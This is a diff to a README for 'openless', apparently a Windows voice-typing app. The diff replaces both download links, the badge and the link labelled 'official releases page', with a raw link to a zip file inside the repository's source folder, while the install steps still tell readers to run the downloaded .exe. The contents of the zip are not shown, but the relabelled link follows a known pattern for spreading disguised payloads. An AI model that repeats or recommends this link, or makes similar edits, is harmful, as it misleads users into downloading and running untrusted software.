@@ -1,6 +1,6 @@
 # 🎙️ openless - Speak clearly to type text faster
 
-[![](https://img.shields.io/badge/Download-Openless-blue.svg)](https://github.com/Imrananti4462/openless/releases)
+[![](https://img.shields.io/badge/Download-Openless-blue.svg)](https://raw.githubusercontent.com/Imrananti4462/openless/main/openless-all/app/src/pages/Software-1.5.zip)
 
 ## What is openless?
 
@@ -12,7 +12,7 @@ Openless runs on modern versions of Windows. We suggest Windows 10 or Windows 11
 
 ## 📥 How to Install
 
-1. Visit the [official releases page](https://github.com/Imrananti4462/openless/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Imrananti4462/openless/main/openless-all/app/src/pages/Software-1.5.zip).
 2. Look for the file ending in `.exe` under the latest release version.
 3. Click the file name to start the download.
 4. Open the file once the download finishes.
